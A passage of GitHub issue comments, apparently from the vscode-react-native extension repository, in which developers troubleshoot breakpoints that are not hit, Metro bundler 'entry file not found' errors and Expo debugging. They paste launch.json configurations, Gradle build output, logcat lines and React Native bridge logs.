{\"id\":10242,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":29}]]}\nTo RN APP: {\"replyID\":10242,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[53,2000,1523203799909,false],[1],[1],[1],[1]],342]\"}\nFrom RN APP: {\"id\":10243,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[53]]]}\nTo RN APP: {\"replyID\":10243,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},30]],347]\"}\nFrom RN APP: {\"id\":10244,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":30}]]}\nTo RN APP: {\"replyID\":10244,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[54,2000,1523203801928,false],[1],[1],[1],[1]],352]\"}\nFrom RN APP: {\"id\":10245,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[54]]]}\nTo RN APP: {\"replyID\":10245,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},31]],357]\"}\nFrom RN APP: {\"id\":10246,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":31}]]}\nTo RN APP: {\"replyID\":10246,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[55,2000,1523203803945,false],[1],[1],[1],[1]],362]\"}\nFrom RN APP: {\"id\":10247,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[55]]]}\nTo RN APP: {\"replyID\":10247,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},32]],367]\"}\nFrom RN APP: {\"id\":10248,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":32}]]}\nTo RN APP: {\"replyID\":10248,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[56,2000,1523203805968,false],[1],[1],[1],[1]],372]\"}\nFrom RN APP: {\"id\":10249,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[56]]]}\nTo RN APP: {\"replyID\":10249,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},33]],377]\"}\nFrom RN APP: {\"id\":10250,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":33}]]}\nTo RN APP: {\"replyID\":10250,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[57,2000,1523203807986,false],[1],[1],[1],[1]],382]\"}\nFrom RN APP: {\"id\":10251,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[57]]]}\nTo RN APP: {\"replyID\":10251,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},34]],387]\"}\nFrom RN APP: {\"id\":10252,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":34}]]}\nTo RN APP: {\"replyID\":10252,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[58,2000,1523203810005,false],[1],[1],[1],[1]],392]\"}\n```. @ruslan-bikkinin they don't. Not when trying to reset them after VSCode has attached either. They remain unverified.\nProbably unrelated but create-react-native-app (and maybe other Expo or bare React Native apps) redbox entries take a few seconds here before resolving to source files.\nI.e. before this\n\nbecomes\n\n. ",
    "gweizi": "@twistedinferno \nHey\nIt seems like I'm facing the same issue.\nBreakpoints kept not bounded after attached the debugger to the package.\nBreakpoints can be hit only in crna-entry.bundle file\nI tried both Andorid Emulator and Genymotion\nOn chrome http://localhost:19001/debugger-ui/ it works just fine, the breakpoints hit in the \"real\" files.\nThanks!. ",
    "twistedinferno": "Hi, I'm afraid I'm not using expo any more.  Maybe someone else can help?. ",
    "wjielim": "@iTOYS May I have a look in your launch.json? \nI'm using Expo and couldn't get the debugger working . ",
    "RupamShaw": "Vscode not working with expo\n\n. ",
    "Ogglas": "Wrong project :). ",
    "Gatix": "I'm running into the same issue and finally found the culprit. Running which react-native outputs node_modules/.bin/react-native where it should be calling the global react-native-cli package.\nA workaround is removing node_modules/.bin or making sure you're loading the react-native-cli bin.. ",
    "allforabit": "Could this issue be reopened as I'm getting the exact same error on Windows 10. I don't get it when using react native directly, only when using VSCode. The issue seems to be related to the command that runs react-native start. If I run that manually and then run debugging or attach tasks everything works as expected.. OK thanks will do @iTOYS . Hi apologies I haven't had a chance to check just yet but will do at some point today or tomorrow. Thanks!. Hi @iTOYS apologies about the delay. I've cleared out the cache and even started a new project (based on react-native init MyProject and am still having no luck. Please note the instructions to clear the cache aren't specific to Windows and are a bit of date as far as I can see. I followed along as closely as possible and manually removed any folders that might have been causing problems. I also cleared out my global yarn dependencies and reinstalled react-native-cli globally. I have tried on my mac and I'm not getting the issue. On Windows I only experience problems when trying to run from vscode-react-native. Starting with react-native run-android works fine. Here's the output from my attempt just now to start the app:\n```\n[Info] Starting Packager\nScanning folders for symlinks in c:\\Users\\Admin\\Desktop\\RNTest\\node_modules (31ms)\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                                                                              \u2502\n\u2502  Running Metro Bundler on port 8081.                                         \u2502\n\u2502                                                                              \u2502\n\u2502  Keep Metro running while developing on any JS projects. Feel free to        \u2502\n\u2502  close this tab and run your own Metro instance if you prefer.               \u2502\n\u2502                                                                              \u2502\n\u2502  https://github.com/facebook/react-native                                    \u2502\n\u2502                                                                              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\nLooking for JS files in\n   c:\\Users\\Admin\\Desktop\\RNTest \nMetro Bundler ready.\n[Info] Packager started.\n[Info] Prewarming bundle cache. This may take a while ...\n[Info] Entry point at c:\\Users\\Admin\\Desktop\\RNTest\\index.android.js doesn't exist. Skipping prewarming...\n[Info] Building and running application.\nLoading dependency graph, done.\nStarting custom debugger by executing: echo A debugger is not needed:  \"c:\\Users\\Admin\\Desktop\\RNTest\"\n[Info] Enable JS Debugging\nStarting custom debugger by executing: echo A debugger is not needed:  \"c:\\Users\\Admin\\Desktop\\RNTest\"\nStarting custom debugger by executing: echo A debugger is not needed:  \"c:\\Users\\Admin\\Desktop\\RNTest\"\nStarting custom debugger by executing: echo A debugger is not needed:  \"c:\\Users\\Admin\\Desktop\\RNTest\"\nerror: bundling failed: NotFoundError: Cannot find entry file index.js in any of the roots: [\"c:\\Users\\Admin\\Desktop\\RNTest\"]\n    at DependencyGraph.getAbsolutePath (c:\\Users\\Admin\\Desktop\\RNTest\\node_modules\\metro\\src\\node-haste\\DependencyGraph.js:317:11)\n    at c:\\Users\\Admin\\Desktop\\RNTest\\node_modules\\metro\\src\\DeltaBundler\\DeltaCalculator.js:280:416\n    at Generator.next ()\n    at step (c:\\Users\\Admin\\Desktop\\RNTest\\node_modules\\metro\\src\\DeltaBundler\\DeltaCalculator.js:11:445)\n    at c:\\Users\\Admin\\Desktop\\RNTest\\node_modules\\metro\\src\\DeltaBundler\\DeltaCalculator.js:11:605\n    at \n    at process._tickCallback (internal/process/next_tick.js:188:7)\n BUNDLE  [android, dev] ./index.js \u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591 0.0% (0/1), failed.\n```\nThanks very much. Let me know if there's any other details that might help.. Here you go @iTOYS ...\nInitial screen:\n```\nC:\\Users\\Admin\\Desktop\\RNTest>react-native run-android\nScanning folders for symlinks in C:\\Users\\Admin\\Desktop\\RNTest\\node_modules (20ms)\nStarting JS server...\nBuilding and installing the app on the device (cd android && gradlew.bat installDebug)...\nIncremental java compilation is an incubating feature.\n:app:preBuild UP-TO-DATE\n:app:preDebugBuild UP-TO-DATE\n:app:checkDebugManifest\n:app:preReleaseBuild UP-TO-DATE\n:app:prepareComAndroidSupportAppcompatV72301Library UP-TO-DATE\n:app:prepareComAndroidSupportSupportV42301Library UP-TO-DATE\n:app:prepareComFacebookFbuiTextlayoutbuilderTextlayoutbuilder100Library UP-TO-DATE\n:app:prepareComFacebookFrescoDrawee130Library UP-TO-DATE\n:app:prepareComFacebookFrescoFbcore130Library UP-TO-DATE\n:app:prepareComFacebookFrescoFresco130Library UP-TO-DATE\n:app:prepareComFacebookFrescoImagepipeline130Library UP-TO-DATE\n:app:prepareComFacebookFrescoImagepipelineBase130Library UP-TO-DATE\n:app:prepareComFacebookFrescoImagepipelineOkhttp3130Library UP-TO-DATE\n:app:prepareComFacebookReactReactNative0554Library UP-TO-DATE\n:app:prepareComFacebookSoloaderSoloader010Library UP-TO-DATE\n:app:prepareOrgWebkitAndroidJscR174650Library UP-TO-DATE\n:app:prepareDebugDependencies\n:app:compileDebugAidl UP-TO-DATE\n:app:compileDebugRenderscript UP-TO-DATE\n:app:generateDebugBuildConfig UP-TO-DATE\n:app:mergeDebugShaders UP-TO-DATE\n:app:compileDebugShaders UP-TO-DATE\n:app:generateDebugAssets UP-TO-DATE\n:app:mergeDebugAssets UP-TO-DATE\n:app:generateDebugResValues UP-TO-DATE\n:app:generateDebugResources UP-TO-DATE\n:app:mergeDebugResources UP-TO-DATE\n:app:bundleDebugJsAndAssets SKIPPED\n:app:processDebugManifest UP-TO-DATE\n:app:processDebugResources UP-TO-DATE\n:app:generateDebugSources UP-TO-DATE\n:app:incrementalDebugJavaCompilationSafeguard UP-TO-DATE\n:app:compileDebugJavaWithJavac UP-TO-DATE\n:app:compileDebugNdk UP-TO-DATE\n:app:compileDebugSources UP-TO-DATE\n:app:transformClassesWithDexForDebug UP-TO-DATE\n:app:mergeDebugJniLibFolders UP-TO-DATE\n:app:transformNative_libsWithMergeJniLibsForDebug UP-TO-DATE\n:app:processDebugJavaRes UP-TO-DATE\n:app:transformResourcesWithMergeJavaResForDebug UP-TO-DATE\n:app:validateSigningDebug\n:app:packageDebug UP-TO-DATE\n:app:assembleDebug UP-TO-DATE\n:app:installDebug\nInstalling APK 'app-debug.apk' on 'Nexus_4_API_22(AVD) - 5.1.1' for app:debug\nInstalled on 1 device.\nBUILD SUCCESSFUL\nTotal time: 8.416 secs\nRunning E:\\Android\\sdk/platform-tools/adb -s emulator-5554 reverse tcp:8081 tcp:8081\nStarting the app on emulator-5554 (E:\\Android\\sdk/platform-tools/adb -s emulator-5554 shell am start -n com.rntest/com.rntest.MainActivity)...\nStarting: Intent { cmp=com.rntest/.MainActivity }\n```\nMetro bundler popup window:\n```\nScanning folders for symlinks in C:\\Users\\Admin\\Desktop\\RNTest\\node_modules (30ms)\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                                                                              \u2502\n\u2502  Running Metro Bundler on port 8081.                                         \u2502\n\u2502                                                                              \u2502\n\u2502  Keep Metro running while developing on any JS projects. Feel free to        \u2502\n\u2502  close this tab and run your own Metro instance if you prefer.               \u2502\n\u2502                                                                              \u2502\n\u2502  https://github.com/facebook/react-native                                    \u2502\n\u2502                                                                              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\nLooking for JS files in\n   C:\\Users\\Admin\\Desktop\\RNTest\nMetro Bundler ready.\nLoading dependency graph, done.\n BUNDLE  [android, dev] ./index.js \u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593 100.0% (481/481), done.\n```\n. Thanks for all the help. Unfortunately I'm still experiencing the issue.\nJust to confirm. I cleared the watchman cache by running this command in the project root:\nC:\\Users\\Admin\\Desktop\\RNTest>watchman watch-del-all\n{\n    \"version\": \"4.9.1\",\n    \"roots\": [\n        \"C:/Users/Admin/Desktop/RNTest\"\n    ]\n}\nIt does seem to get a bit further along but gives me the following error in the debug output:\nOS: win32 x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.17.3\nStarting debugger app worker.\nEstablished a connection with the Proxy (Packager) to the React Native application\nDebugger worker loaded runtime on port 12436\nCouldn't import script at <http://localhost:8081/index.bundle?platform=android&dev=true&minify=false>. Debugging won't work: Try reloading the JS from inside the app, or Reconnect the VS Code debugger: {\"message\":\"Cannot find entry file index.js in any of the roots: [\\\"c:\\\\\\\\Users\\\\\\\\Admin\\\\\\\\Desktop\\\\\\\\RNTest\\\"]\",\"name\":\"NotFoundError\",\"type\":\"NotFoundError\",\"status\":404,\"errors\":[{\"description\":\"Cannot find entry file index.js in any of the roots: [\\\"c:\\\\\\\\Users\\\\\\\\Admin\\\\\\\\Desktop\\\\\\\\RNTest\\\"]\"}],\"stack\":\"NotFoundError: Cannot find entry file index.js in any of the roots: [\\\"c:\\\\\\\\Users\\\\\\\\Admin\\\\\\\\Desktop\\\\\\\\RNTest\\\"]\\n    at DependencyGraph.getAbsolutePath (c:\\\\Users\\\\Admin\\\\Desktop\\\\RNTest\\\\node_modules\\\\metro\\\\src\\\\node-haste\\\\DependencyGraph.js:317:11)\\n    at c:\\\\Users\\\\Admin\\\\Desktop\\\\RNTest\\\\node_modules\\\\metro\\\\src\\\\DeltaBundler\\\\DeltaCalculator.js:280:416\\n    at Generator.next (<anonymous>)\\n    at step (c:\\\\Users\\\\Admin\\\\Desktop\\\\RNTest\\\\node_modules\\\\metro\\\\src\\\\DeltaBundler\\\\DeltaCalculator.js:11:445)\\n    at c:\\\\Users\\\\Admin\\\\Desktop\\\\RNTest\\\\node_modules\\\\metro\\\\src\\\\DeltaBundler\\\\DeltaCalculator.js:11:605\\n    at <anonymous>\\n    at process._tickCallback (internal/process/next_tick.js:188:7)\"}\nAnd the following error in React Native output:\n```\n[Info] Starting Packager\nScanning folders for symlinks in c:\\Users\\Admin\\Desktop\\RNTest\\node_modules (23ms)\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                                                                              \u2502\n\u2502  Running Metro Bundler on port 8081.                                         \u2502\n\u2502                                                                              \u2502\n\u2502  Keep Metro running while developing on any JS projects. Feel free to        \u2502\n\u2502  close this tab and run your own Metro instance if you prefer.               \u2502\n\u2502                                                                              \u2502\n\u2502  https://github.com/facebook/react-native                                    \u2502\n\u2502                                                                              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\nLooking for JS files in\n   c:\\Users\\Admin\\Desktop\\RNTest \nMetro Bundler ready.\n[Info] Packager started.\n[Info] Prewarming bundle cache. This may take a while ...\n[Info] Entry point at c:\\Users\\Admin\\Desktop\\RNTest\\index.android.js doesn't exist. Skipping prewarming...\n[Info] Building and running application.\nLoading dependency graph, done.\nStarting custom debugger by executing: echo A debugger is not needed:  \"c:\\Users\\Admin\\Desktop\\RNTest\"\n[Info] Enable JS Debugging\nStarting custom debugger by executing: echo A debugger is not needed:  \"c:\\Users\\Admin\\Desktop\\RNTest\"\nStarting custom debugger by executing: echo A debugger is not needed:  \"c:\\Users\\Admin\\Desktop\\RNTest\"\nStarting custom debugger by executing: echo A debugger is not needed:  \"c:\\Users\\Admin\\Desktop\\RNTest\"\nerror: bundling failed: NotFoundError: Cannot find entry file index.js in any of the roots: [\"c:\\Users\\Admin\\Desktop\\RNTest\"]\n    at DependencyGraph.getAbsolutePath (c:\\Users\\Admin\\Desktop\\RNTest\\node_modules\\metro\\src\\node-haste\\DependencyGraph.js:317:11)\n    at c:\\Users\\Admin\\Desktop\\RNTest\\node_modules\\metro\\src\\DeltaBundler\\DeltaCalculator.js:280:416\n    at Generator.next ()\n    at step (c:\\Users\\Admin\\Desktop\\RNTest\\node_modules\\metro\\src\\DeltaBundler\\DeltaCalculator.js:11:445)\n    at c:\\Users\\Admin\\Desktop\\RNTest\\node_modules\\metro\\src\\DeltaBundler\\DeltaCalculator.js:11:605\n    at \n    at process._tickCallback (internal/process/next_tick.js:188:7)\n BUNDLE  [android, dev] ./index.js \u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591 0.0% (0/1), failed.\n`` . Thanks @iTOYS  I will try to do this today but if not over the weekend. . I have it building successfully now. However I'm not sure where in that file I should add that line of code (this.logger.error(JSON.stringify(spawnOptions.env, null, 2));`). Thanks @iTOYS \n. Ok thanks @iTOYS I'll add that to that line. Sorry I meant I had got the vscode-react-native plugin built and working. I still haven't got it actually working.. Yes I'm using nvm for windows so that could be the root of the problems. I'll get back to you with this info asap.. Sorry I've had a very busy week and haven't had a chance yet. It really sounds like it's an issue with my setup though. Feel free to close for now. Hope to have another look over the weekend. . ",
    "joshsiegl1": "Hey @ruslan-bikkinin , this isn't an issue for me anymore, thanks for replying though. I believe my solution was to upgrade to the latest version of Node.. ",
    "shivawu": "Ping?. @ruslan-bikkinin Thanks for catching it. Hmm, this is very weird. \nThe reason is that, it seems remoteExtension.launch is returning a native Promise, instead of a Q promise, who is lacking of the spread API. I would guess that TS did some magic behind the scene regarding the compilation of promise API. But I might be mistaken.\nLet me know if it works.. From the error message it looks like the plugin fails to communicate via the socket because it didn't find it. Is there any way that you could pack your small project and send it to me so that I can have a repro?. Hey @ruslan-bikkinin, QQ: I'm trying to debug the issue, but apparently something changed on the vscode side, where if I use a locally linked clone of the repo, it says command 'reactNative.runIosSimulator not found. If I install the official extension from the marketplace it works fine (the command runs). Anything I might be missing?. Sorry it took a long time for me to pick this up.\nOn the current change, the issue is the getProjectRoot function, since we changed to use the workspaceRoot, it should not try to parse settings.json, since 1. we now use rootPath directly to name the socket, 2. parsing settings.json is not correct in many cases.\nHowever, I'm stuck currently with another issue, the forkedAppWorker would try to construct a RemoteExtension instance from the passed in projectRootPath, in which RemoteExtension now expects the root path, not the projectRootPath. So basically we'll have to pass both rootPath and projectRootPath all the way from nodeDebugWrapper->AppWorker->ForkedAppWorker for it to correctly use the right path. Not sure if that's the best way to do this.. @iTOYS Thanks for the fix, I think it definitely covers the issue!\nHey @ruslan-bikkinin, thanks for getting back! For sure, the issue with the \"hacky\" method is it doesn't read workspace settings file. For example, in my setup, I have the following in my workspace .code-workspace file.\n{\n  \"settings\": {\n    \"react-native-tools.projectRoot\": \"./my-app\"\n  }\n}\nIn this case, that approach of parsing the path would not work. Moreover, it's possible to use things like ${workspaceRoot} in this settings, which makes it even harder. Maybe we could just force it to be relative, then that would make things easier as just finding the project file correctly?. ",
    "icahnchen": "@annakocheshkova Thanks for your reply.\nHere is my detailed procedure...\nI  initiated the new project reference React-Native site: React Native-\n      Building Projects with Native Code, and created the launch.json as below:\n`{\n    \"version\": \"0.2.0\",\n    \"configurations\": [\n    {\n        \"name\": \"Debug Android\",\n        \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n        \"type\": \"reactnative\",\n        \"request\": \"launch\",\n        \"platform\": \"android\",\n        \"sourceMaps\": true,\n        \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n    },\n    {\n        \"name\": \"Debug iOS\",\n        \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n        \"type\": \"reactnative\",\n        \"request\": \"launch\",\n        \"platform\": \"ios\",\n        \"sourceMaps\": true,\n        \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n    },\n    {\n        \"name\": \"Attach to packager\",\n        \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n        \"type\": \"reactnative\",\n        \"request\": \"attach\",\n        \"sourceMaps\": true,\n        \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n    },\n    {\n        \"name\": \"Debug in Exponent\",\n        \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n        \"type\": \"reactnative\",\n        \"request\": \"launch\",\n        \"platform\": \"exponent\",\n        \"sourceMaps\": true,\n        \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n    }\n]\n\n}`\nand then Debug with 'Debug Android'.\nReact Native:Run android output information\n`[Warning] Target simulator is not supported for Android platform. If you want to use particular device or simulator for launching Android app, please specify  device id (as in 'adb devices' output) instead.\n[Info] Starting React Native Packager.\nScanning folders for symlinks in c:\\Projects\\AwesomeProject\\node_modules (77ms)\nBuilding and installing the app on the device (cd android && gradlew.bat installDebug)...\nIncremental java compilation is an incubating feature.\n:app:preBuild UP-TO-DATE\n:app:preDebugBuild UP-TO-DATE\n:app:checkDebugManifest\n:app:preReleaseBuild UP-TO-DATE\n:app:prepareComAndroidSupportAppcompatV72301Library UP-TO-DATE\n:app:prepareComAndroidSupportSupportV42301Library UP-TO-DATE\n:app:prepareComFacebookFbuiTextlayoutbuilderTextlayoutbuilder100Library UP-TO-DATE\n:app:prepareComFacebookFrescoDrawee130Library UP-TO-DATE\n:app:prepareComFacebookFrescoFbcore130Library UP-TO-DATE\n:app:prepareComFacebookFrescoFresco130Library UP-TO-DATE\n:app:prepareComFacebookFrescoImagepipeline130Library UP-TO-DATE\n:app:prepareComFacebookFrescoImagepipelineBase130Library UP-TO-DATE\n:app:prepareComFacebookFrescoImagepipelineOkhttp3130Library UP-TO-DATE\n:app:prepareComFacebookReactReactNative0552Library UP-TO-DATE\n:app:prepareComFacebookSoloaderSoloader010Library UP-TO-DATE\n:app:prepareOrgWebkitAndroidJscR174650Library UP-TO-DATE\n:app:prepareDebugDependencies\n:app:compileDebugAidl UP-TO-DATE\n:app:compileDebugRenderscript UP-TO-DATE\n:app:generateDebugBuildConfig UP-TO-DATE\n:app:mergeDebugShaders UP-TO-DATE\n:app:compileDebugShaders UP-TO-DATE\n:app:generateDebugAssets UP-TO-DATE\n:app:mergeDebugAssets UP-TO-DATE\n:app:generateDebugResValues UP-TO-DATE\n:app:generateDebugResources UP-TO-DATE\n:app:mergeDebugResources UP-TO-DATE\n:app:bundleDebugJsAndAssets SKIPPED\n:app:processDebugManifest UP-TO-DATE\n:app:processDebugResources UP-TO-DATE\n:app:generateDebugSources UP-TO-DATE\n:app:incrementalDebugJavaCompilationSafeguard UP-TO-DATE\n:app:compileDebugJavaWithJavac UP-TO-DATE\n:app:compileDebugNdk UP-TO-DATE\n:app:compileDebugSources UP-TO-DATE\n:app:transformClassesWithDexForDebug UP-TO-DATE\n:app:mergeDebugJniLibFolders UP-TO-DATE\n:app:transformNative_libsWithMergeJniLibsForDebug UP-TO-DATE\n:app:processDebugJavaRes UP-TO-DATE\n:app:transformResourcesWithMergeJavaResForDebug UP-TO-DATE\n:app:validateSigningDebug\n:app:packageDebug UP-TO-DATE\n:app:assembleDebug UP-TO-DATE\n:app:installDebug\nInstalling APK 'app-debug.apk' on 'Pixel_XL_API_23(AVD) - 6.0' for app:debug\nInstalled on 1 device.\nBUILD SUCCESSFUL\nTotal time: 18.988 secs\nRunning C:\\Android\\Sdk/platform-tools/adb -s emulator-5554 reverse tcp:8081 tcp:8081\nStarting the app on emulator-5554 (C:\\Android\\Sdk/platform-tools/adb -s emulator-5554 shell am start -n com.awesomeproject/com.awesomeproject.MainActivity)...\nStarting: Intent { cmp=com.awesomeproject/.MainActivity }`\nReact Native output Info\nStarting custom debugger by executing: echo A debugger is not needed:  \"c:\\Projects\\AwesomeProject\"\nStarting custom debugger by executing: echo A debugger is not needed:  \"c:\\Projects\\AwesomeProject\"\nStarting custom debugger by executing: echo A debugger is not needed:  \"c:\\Projects\\AwesomeProject\"\n BUNDLE  [android, dev] ./index.js \u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593 100.0% (481/481), done.\nLogCat - emulator-5554 output info\n`[Info] 04-17 14:24:18.371  5086  5086 D ReactNative: ReactInstanceManager.onReloadWithJSDebugger()\n04-17 14:24:18.371  5086  5086 D ReactNative: ReactInstanceManager.recreateReactContextInBackground()\n04-17 14:24:18.371  5086  5086 D ReactNative: ReactInstanceManager.runCreateReactContextOnNewThread()\n[Info] 04-17 14:24:20.080  5163  5163 D ReactNative: ReactInstanceManager.ctor()\n[Info] 04-17 14:24:20.115  5163  5163 D ReactNative: ReactInstanceManager.createReactContextInBackground()\n[Info] 04-17 14:24:20.115  5163  5163 D ReactNative: ReactInstanceManager.recreateReactContextInBackgroundInner()\n[Info] 04-17 14:24:20.169  5163  5163 D ReactNative: ReactInstanceManager.onReloadWithJSDebugger()\n[Info] 04-17 14:24:20.170  5163  5163 D ReactNative: ReactInstanceManager.recreateReactContextInBackground()\n[Info] 04-17 14:24:20.170  5163  5163 D ReactNative: ReactInstanceManager.runCreateReactContextOnNewThread()\n[Info] 04-17 14:24:25.480  5163  5182 D ReactNative: ReactInstanceManager.createReactContext()\n[Info] 04-17 14:24:25.724  5163  5182 D ReactNative: Initializing React Xplat Bridge.\n[Info] 04-17 14:24:25.813  5163  5182 D ReactNative: Initializing React Xplat Bridge before initializeBridge\n[Info] 04-17 14:24:25.826  5163  5182 D ReactNative: Initializing React Xplat Bridge after initializeBridge\n[Info] 04-17 14:24:25.826  5163  5182 D ReactNative: CatalystInstanceImpl.runJSBundle()\n[Info] 04-17 